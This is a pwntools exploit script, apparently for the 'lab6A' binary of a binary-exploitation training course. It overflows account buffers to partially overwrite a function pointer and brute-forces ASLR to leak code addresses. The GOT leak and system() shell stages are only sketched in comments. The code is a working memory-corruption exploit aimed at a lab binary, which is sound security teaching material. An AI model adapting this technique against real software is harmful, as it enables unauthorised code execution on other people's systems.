# Based on https://github.com/ewilded/MBE-snippets/blob/master/lab6B/exploit_remote.py
from pwn import *

settings = {

    # Path to binary
    "binary"        : "./lab6A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (setup account).
    p.sendlineafter("Enter Choice: ", "1")  
	
    # Send the name (31 characters + newline -> 32 chars)	
    p.recvuntil("Enter your name: ")		
    payload = "A" * 0x1f # 31 A's (just to fill the username)
    p.sendline(payload)
	
	# Send the description - 90 characters + EXACTLY TWO BYTES to partially overwrite the function pointer.
	# To avoid a newline creeping in and fucking up the second byte of the address (out of bound of our PARTIAL write)
	# we want to use send_raw() instead of sendline()/sendlineafter():
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to attai the saved print_listing() address
    payload = payload + p16(0xbbe2)
    p.send(payload)
    
    # OK, call this thing:
    p.sendlineafter("Enter Choice: ", "3")
	
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    try:
        leak = p.recv()
	
    except EOFError:
	    print("No luck with ASLR this time.")
	    return 1	# let's return 1 to indicate that the program crashed, which means we failed with our guess of the ASLR-ed halfbyte and that the exploit() function must call this method again
    except:
       print("Another exception occured.")
       return 2

	# Some verbose output for debugging/troubleshooting purpose 
    # (this is redundant with context.log_level='debug' though).
    print("ASLR guess successful, below is the entire leak:") 
    print(leak)

    print_name_addr = u32(leak[0xaa:0xae]) # bytes 170:174 contain the address	
    print("print_name()'s current address: %x", hex(print_name_addr))
	
    # Calculate the base of the code segment:
    base_code = print_name_addr & 0xfffff000
	
    # Calculate the base of the data segment:
    base_data = base_code + 0x3000
	
    # This is where GOT for printf is held (we have to leak it with write_wrap())
    printf_got_addr = base_data + 0x10

    # Calculate the write_wrap_address based on the known offset and the code segment base we have already leaked
    write_wrap_addr = base_code + 0x97a
	
    # Now, we overflow the setup_account() once again.
    # We want our payload to achieve two things at the same time:
    # 1) overwrite the merchanf.sfunc() address once again, this time with write_wrap()'s address
	# 2) put the printf_got_addr at the beginning of the merchant buffer (user.name), because after when when we issue another call below:
	#  ((void (*) (struct uinfo *) ) merchant.sfunc) (&merchant);it is going to become the argument for the 
	# the address pointed by merchant is going to be the argument (which is exactly what we want, we want to pass the GOT to the write_wrap() call, so it prints
	# the libc printf() address to us.
	
	# Then we leak the printf() address by entering 3).
	
	# Then calculate the system() address.

    # Then we issue the setup_account() overflow for the third time, this time by putting an arbitrary string (our command to execute by sh) at the beginning of the merchant buffer (merchant.name), while putting system()'s address after the 90 characters of the description property (overwriting the sfunc pointer for the third time).
	
	# Then we get our code execution by entering 3).
	
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    p = process(binary.path)
    while(exploit()): # this will NOT return if successful (instead, it's gonna hang on the shell :))
	    pass
